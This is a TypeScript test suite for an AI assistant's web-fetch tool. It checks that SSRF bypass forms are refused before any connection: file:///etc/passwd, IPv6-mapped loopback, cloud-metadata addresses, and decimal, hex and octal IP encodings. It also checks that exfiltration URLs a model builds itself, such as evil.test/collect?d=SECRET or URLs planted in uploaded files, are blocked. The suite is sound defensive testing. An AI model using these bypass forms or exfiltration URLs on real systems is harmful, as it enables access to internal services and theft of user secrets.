import test from 'node:test'
import assert from 'node:assert/strict'
import { htmlToReadableText, safeGet } from './web.ts'

test('extrai texto e remove conteúdo não legível', () => {
  const page = htmlToReadableText('<title>A &amp; B</title><nav>menu</nav><main><h1>Título</h1><p>Texto <a href="/fonte">fonte</a>.</p></main><script>segredo()</script>')
  assert.equal(page.title, 'A & B')
  assert.match(page.text, /Título/)
  assert.match(page.text, /fonte \(\/fonte\)/)
  assert.doesNotMatch(page.text, /menu|segredo/)
})

test('bloqueia protocolos e destinos privados', async () => {
  await assert.rejects(() => safeGet('file:///etc/passwd'), /HTTP\/HTTPS/)
  await assert.rejects(() => safeGet('http://127.0.0.1/'), /privado/)
  await assert.rejects(() => safeGet('http://[::1]/'), /privado/)
})

// ---- SSRF regression: web_fetch (fetchWebPage → safeGet) --------------------
// Customer report: WHATWG `new URL()` rewrites `[::ffff:127.0.0.1]` to the hex
// form `[::ffff:7f00:1]`; a dotted-only mapped-IPv4 check (v1.2.0–v1.4.0) let it
// through. Every case below runs against a throwaway server on 127.0.0.1 that
// returns a marker, and asserts the guard rejects BEFORE any request is opened
// (http.request never called, server never hit). No external network.
import http from 'node:http'
import https from 'node:https'
import dns from 'node:dns/promises'
import { EventEmitter } from 'node:events'
import { fetchWebPage, urlInPriorContext, looksLikeCredentialUrl, buildUrlProvenance } from './web.ts'
import { invokeTool } from './tools.ts'
import { setLogWriter } from './log.ts'

const MARKER = 'SSRF-MARKER-web-fetch'

async function withMarkerServer<T>(fn: (port: number, hits: () => number) => Promise<T>): Promise<T> {
  let hits = 0
  const server = http.createServer((_req, res) => {
    hits++
    res.writeHead(200, { 'content-type': 'text/plain' })
    res.end(MARKER)
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  try {
    return await fn((server.address() as import('node:net').AddressInfo).port, () => hits)
  } finally {
    await new Promise((resolve) => server.close(resolve))
  }
}

const PRIVATE_LITERALS = [
  (p: number) => `http://127.0.0.1:${p}/`,
  (p: number) => `http://[::ffff:127.0.0.1]:${p}/`, // URL → [::ffff:7f00:1] (the reported bypass)
  (p: number) => `http://[::ffff:7f00:1]:${p}/`,
  (p: number) => `http://[0:0:0:0:0:ffff:7f00:1]:${p}/`,
  () => 'http://[::ffff:a9fe:a9fe]/', // 169.254.169.254, cloud metadata
  () => 'http://[::ffff:169.254.169.254]/',
  (p: number) => `http://[::127.0.0.1]:${p}/`, // IPv4-compatible → [::7f00:1]
  (p: number) => `http://[64:ff9b::7f00:1]:${p}/`, // NAT64
  (p: number) => `http://[::1]:${p}/`,
  (p: number) => `http://2130706433:${p}/`, // decimal → 127.0.0.1
  (p: number) => `http://0x7f.1:${p}/`, // hex/short → 127.0.0.1
  (p: number) => `http://0177.0.0.1:${p}/`, // octal → 127.0.0.1
  (p: number) => `http://localhost:${p}/`,
]

for (const make of PRIVATE_LITERALS) {
  const label = make(0).replace(':0/', ':PORT/')
  test(`web_fetch bloqueia ${label} antes de conectar`, async (t) => {
    await withMarkerServer(async (port, hits) => {
      const request = t.mock.method(http, 'request')
      const url = make(port)
      await assert.rejects(() => fetchWebPage(url), /privado|local não permitido/)
      await assert.rejects(() => safeGet(url), /privado|local não permitido/)
      assert.equal(request.mock.callCount(), 0, 'no socket may be opened')
      assert.equal(hits(), 0, 'internal service must not be reached')
    })
  })
}

test('web_fetch bloqueia hostname que resolve para IPv4 mapeado em IPv6', async (t) => {
  await withMarkerServer(async (port, hits) => {
    const request = t.mock.method(http, 'request')
    for (const answers of [
      [{ address: '::ffff:127.0.0.1', family: 6 }],
      [{ address: '::ffff:7f00:1', family: 6 }],
      [{ address: '::ffff:a9fe:a9fe', family: 6 }],
      [{ address: '93.184.215.14', family: 4 }, { address: '::ffff:7f00:1', family: 6 }], // any private answer
    ]) {
      t.mock.method(dns, 'lookup', async () => answers)
      await assert.rejects(() => fetchWebPage(`http://mapped.example.test:${port}/`), /resolve para endereço privado/)
    }
    assert.equal(request.mock.callCount(), 0)
    assert.equal(hits(), 0)
  })
})

test('web_fetch não segue redirect de host público para alvo privado', async (t) => {
  await withMarkerServer(async (port, hits) => {
    // First hop: a public-looking host. DNS and the HTTP exchange are stubbed so
    // nothing leaves the machine; the stub answers 302 to the mapped loopback.
    t.mock.method(dns, 'lookup', async () => [{ address: '93.184.215.14', family: 4 }])
    const targets = [
      `http://[::ffff:7f00:1]:${port}/`,
      `http://[::ffff:127.0.0.1]:${port}/`,
      'http://[::ffff:a9fe:a9fe]/latest/meta-data/',
      `http://127.0.0.1:${port}/`,
    ]
    for (const location of targets) {
      // minimal stand-in for ClientRequest / IncomingMessage (only what web.ts touches)
      type FakeReq = EventEmitter & { setTimeout: () => FakeReq; destroy: () => void; end: () => void }
      type FakeRes = EventEmitter & { statusCode: number; headers: Record<string, string> }
      const request = t.mock.method(http, 'request', ((opts: { hostname: string }, onResponse: (res: FakeRes) => void) => {
        assert.equal(opts.hostname, 'public.example.test')
        const req = new EventEmitter() as FakeReq
        req.setTimeout = () => req
        req.destroy = () => {}
        req.end = () => {
          const res = new EventEmitter() as FakeRes
          res.statusCode = 302
          res.headers = { location }
          onResponse(res)
          res.emit('end')
        }
        return req
      }) as unknown as typeof http.request)
      await assert.rejects(() => fetchWebPage('http://public.example.test/start'), /privado/)
      assert.equal(request.mock.callCount(), 1, `only the public hop may be requested (${location})`)
      request.mock.restore()
    }
    assert.equal(hits(), 0)
  })
})

// ---- md-exfil T6: web_fetch only opens URLs the user or a web search named -----------------------------------------
// The model must not be able to choose a destination (https://evil.test/?d=<secret>). The check runs in the tool
// resolver, before fetchWebPage, so a refusal opens no socket. `http.request` is mocked and counted.

const PROV = { userText: ['leia https://docs.example.test/guia por favor.'], webResults: ['1. Doc\n   https://news.example.test/a?id=1#frag\n'] }
const fetchTool = (url: string, prov: { userText: readonly string[]; webResults: readonly string[] }) =>
  invokeTool('tok', { kind: 'web-fetch' } as never, { url }, { email: 'a@x.com', urlProvenance: prov } as never)

test('urlInPriorContext: exact normalized match against user text and web results (fragment ignored)', () => {
  assert.equal(urlInPriorContext('https://docs.example.test/guia', PROV), true)
  assert.equal(urlInPriorContext('https://news.example.test/a?id=1', PROV), true)
  assert.equal(urlInPriorContext('https://news.example.test/a?id=1#other', PROV), true)
  assert.equal(urlInPriorContext('https://evil.test/?d=SECRET', PROV), false)
  assert.equal(urlInPriorContext('https://docs.example.test/guia/extra', PROV), false)
  assert.equal(urlInPriorContext('not a url', PROV), false)
})

test('looksLikeCredentialUrl: userinfo and long token-like params', () => {
  assert.equal(looksLikeCredentialUrl('https://u:pw@x.test/'), true)
  assert.equal(looksLikeCredentialUrl('https://x.test/a?token=abcdefghijklmnop1234'), true)
  assert.equal(looksLikeCredentialUrl('https://x.test/a?api_key=abcdefghijklmnop1234'), true)
  assert.equal(looksLikeCredentialUrl('https://x.test/a?page=2'), false)
  assert.equal(looksLikeCredentialUrl('https://x.test/a?token=1'), false)
})

test('buildUrlProvenance: user turns and web_search/web_fetch results only (not Genie/MCP, assistant text or system)', () => {
  const prov = buildUrlProvenance([
    { role: 'system', content: 'see https://sys.test/' },
    { role: 'user', content: [{ type: 'text', text: 'abra https://u.test/x' }] },
    { role: 'assistant', content: 'veja https://model.test/', tool_calls: [
      { id: 'c1', function: { name: 'web_search', arguments: '{}' } },
      { id: 'c2', function: { name: 'genie_ask', arguments: '{}' } },
      { id: 'c3', function: { name: 'web_fetch', arguments: '{}' } },
    ] },
    { role: 'tool', tool_call_id: 'c1', content: 'https://search.test/r' },
    { role: 'tool', tool_call_id: 'c2', content: 'https://genie.test/leak' },
    { role: 'tool', tool_call_id: 'c3', content: 'https://fetched.test/p' },
  ])
  assert.equal(urlInPriorContext('https://u.test/x', prov), true)
  assert.equal(urlInPriorContext('https://search.test/r', prov), true)
  assert.equal(urlInPriorContext('https://fetched.test/p', prov), true)
  for (const u of ['https://sys.test/', 'https://model.test/', 'https://genie.test/leak']) assert.equal(urlInPriorContext(u, prov), false, u)
})

test('web_fetch tool: a URL only the model produced is refused with url_not_in_prior_context, 0 sockets, logged host-only', async (t) => {
  const request = t.mock.method(http, 'request')
  const lines: string[] = []
  const prev = setLogWriter((l) => lines.push(l))
  try {
    const out = await fetchTool('https://evil.test/collect?d=SECRET-DATA', PROV)
    assert.deepEqual(JSON.parse(out.resultText), { error: 'url_not_in_prior_context' })
    assert.equal(request.mock.callCount(), 0, 'no socket may be opened')
    const ev = lines.map((l) => JSON.parse(JSON.parse(l).msg)).filter((e) => e.event === 'egress_blocked')
    assert.equal(ev.length, 1)
    assert.equal(ev[0].surface, 'web_fetch')
    assert.deepEqual(ev[0].hosts, ['evil.test'])
    assert.doesNotMatch(lines.join('\n'), /SECRET-DATA|collect/)
  } finally {
    setLogWriter(prev)
  }
})

test('web_fetch tool: a URL absent from provenance (no provenance at all) is refused', async (t) => {
  const request = t.mock.method(http, 'request')
  const out = await invokeTool('tok', { kind: 'web-fetch' } as never, { url: 'https://docs.example.test/guia' }, { email: 'a@x.com' } as never)
  assert.deepEqual(JSON.parse(out.resultText), { error: 'url_not_in_prior_context' })
  assert.equal(request.mock.callCount(), 0)
})

test('web_fetch provenance refusal makes no connection to a loopback listener', async () => {
  await withMarkerServer(async (port, hits) => {
    const out = await invokeTool(
      'tok',
      { kind: 'web-fetch' } as never,
      { url: `http://127.0.0.1:${port}/collect?d=SECRET` },
      { email: 'a@x.com' } as never,
    )
    assert.deepEqual(JSON.parse(out.resultText), { error: 'url_not_in_prior_context' })
    assert.equal(hits(), 0, 'the listener must receive no request')
  })
})

test('web_fetch tool: a credential-looking URL is refused unless it is in a user message', async (t) => {
  const request = t.mock.method(http, 'request')
  const cred = 'https://news.example.test/a?token=abcdefghijklmnop1234'
  const fromSearch = { userText: [], webResults: [cred] }
  assert.deepEqual(JSON.parse((await fetchTool(cred, fromSearch)).resultText), { error: 'url_not_in_prior_context' })
  assert.equal(request.mock.callCount(), 0)
})

test('web_fetch: an exact credential-looking URL from a user message reaches safeGet', async (t) => {
  t.mock.method(dns, 'lookup', async () => [{ address: '127.0.0.1', family: 4 }])
  const cred = 'https://news.example.test/a?token=abcdefghijklmnop1234'
  const out = await fetchTool(cred, { userText: [`please read ${cred}`], webResults: [] })
    .then((r) => r.resultText, (e) => String(e.message))
  assert.match(out, /resolve para endereço privado/)
  assert.doesNotMatch(out, /url_not_in_prior_context/)
})

test('web_fetch tool: URLs from a user message or a prior search result reach safeGet (and get past the provenance check)', async (t) => {
  t.mock.method(dns, 'lookup', async () => [{ address: '127.0.0.1', family: 4 }]) // private → safeGet refuses, but only AFTER the provenance check passed
  for (const url of ['https://docs.example.test/guia', 'https://news.example.test/a?id=1']) {
    const out = await fetchTool(url, PROV).then((r) => r.resultText, (e) => String(e.message))
    assert.doesNotMatch(out, /url_not_in_prior_context/, url)
  }
})

test('web_fetch: an uploaded-file URL is not user-authored provenance', async (t) => {
  const fileUrl = 'https://attacker.example/collect?token=abcdefghijklmnop1234'
  // turn.ts persists this exact attachment shape inside the role=user content.
  const prov = buildUrlProvenance([{
    role: 'user',
    content: `Summarize this document.\n\n### Arquivo: report.txt\n${fileUrl}`,
  }])
  t.mock.method(dns, 'lookup', async () => [{ address: '93.184.215.14', family: 4 }])
  const request = t.mock.method(https, 'request', ((_opts: unknown, onResponse: (res: never) => void) => {
    type FakeReq = EventEmitter & { setTimeout: () => FakeReq; destroy: () => void; end: () => void }
    type FakeRes = EventEmitter & { statusCode: number; headers: Record<string, string> }
    const req = new EventEmitter() as FakeReq
    req.setTimeout = () => req
    req.destroy = () => {}
    req.end = () => {
      const res = new EventEmitter() as FakeRes
      res.statusCode = 200
      res.headers = { 'content-type': 'text/plain' }
      onResponse(res as never)
      res.emit('data', Buffer.from('ok'))
      res.emit('end')
    }
    return req
  }) as unknown as typeof https.request)

  const out = await fetchTool(fileUrl, prov)
  assert.equal(request.mock.callCount(), 0, 'file-derived URLs must be refused before any socket')
  assert.deepEqual(JSON.parse(out.resultText), { error: 'url_not_in_prior_context' })
})

test('web_fetch: appending query, path, userinfo, encoded data or a trailing-dot host to a known URL is refused', async (t) => {
  const request = t.mock.method(https, 'request', (() => {
    throw new Error('an appended URL must be rejected before http.request')
  }) as unknown as typeof https.request)
  const candidates = [
    'https://docs.example.test/guia?d=SECRET',
    'https://docs.example.test/guia/SECRET',
    'https://docs.example.test/guia?d=%53ECRET',
    'https://user:password@docs.example.test/guia',
    'https://docs.example.test./guia?d=SECRET',
    'https://news.example.test/a?id=1&d=SECRET#frag',
  ]
  for (const url of candidates) {
    const out = await fetchTool(url, PROV)
    assert.deepEqual(JSON.parse(out.resultText), { error: 'url_not_in_prior_context' }, url)
  }
  assert.equal(request.mock.callCount(), 0)
  assert.equal(urlInPriorContext('HTTPS://DOCS.EXAMPLE.TEST/guia', PROV), true, 'host/scheme case normalizes to the same destination')
})

test('web_fetch: a payload appended only in the fragment is not transmitted in the request target', async (t) => {
  t.mock.method(dns, 'lookup', async () => [{ address: '93.184.215.14', family: 4 }])
  const paths: string[] = []
  t.mock.method(https, 'request', ((opts: { path: string }, onResponse: (res: never) => void) => {
    type FakeReq = EventEmitter & { setTimeout: () => FakeReq; destroy: () => void; end: () => void }
    type FakeRes = EventEmitter & { statusCode: number; headers: Record<string, string> }
    const req = new EventEmitter() as FakeReq
    paths.push(opts.path)
    req.setTimeout = () => req
    req.destroy = () => {}
    req.end = () => {
      const res = new EventEmitter() as FakeRes
      res.statusCode = 200
      res.headers = { 'content-type': 'text/plain' }
      onResponse(res as never)
      res.emit('data', Buffer.from('ok'))
      res.emit('end')
    }
    return req
  }) as unknown as typeof https.request)

  await fetchTool('https://docs.example.test/guia#d=SECRET', PROV)
  assert.deepEqual(paths, ['/guia'])
})

test('buildUrlProvenance: only the typed part of a user message counts, across replayed history and array content', () => {
  const att = (typed: string, file: string) => `${typed}\n\n--- ANEXOS ---\n\n### Arquivo: a.txt\n${file}`
  const prov = buildUrlProvenance([
    { role: 'user', content: att('veja https://typed.test/ok', 'https://file1.test/x') },
    { role: 'assistant', content: 'ok' },
    { role: 'user', content: [{ type: 'text', text: att('e https://typed2.test/ok', 'https://file2.test/x') }] },
    { role: 'user', content: att('', 'https://file3.test/x') },
  ])
  for (const u of ['https://typed.test/ok', 'https://typed2.test/ok']) assert.equal(urlInPriorContext(u, prov), true, u)
  for (const u of ['https://file1.test/x', 'https://file2.test/x', 'https://file3.test/x']) assert.equal(urlInPriorContext(u, prov), false, u)
})
